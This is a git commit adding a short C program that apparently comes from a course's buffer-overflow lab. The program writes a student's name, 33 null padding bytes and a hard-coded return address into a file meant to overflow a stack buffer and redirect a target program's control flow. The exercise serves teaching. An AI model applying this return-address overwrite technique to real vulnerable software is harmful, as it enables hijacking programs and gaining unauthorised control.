b2708478a8564f959b6a9df992e8f537213a4269
tanvu <tdv@princeton.edu>
2020-12-01 16:33:28 -0500

    Create createdataB.c

---
+++ createdataB.c
@@ -0,0 +1,27 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    int i;
+    const char name[] = "Tansha Vugarwal";
+    unsigned long ulReturnAddress = 0x400858;
+
+    FILE *psFile;
+    
+    psFile = fopen("data", "w");
+
+    // Printing out name
+    fprintf(psFile, "%s", name);
+
+    for (i = 0; i < 33; i++)
+    {
+        putc('\0', psFile); /* Writes 00000000 */
+    }
+
+    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);
+    
+    fclose(psFile);
+}
+
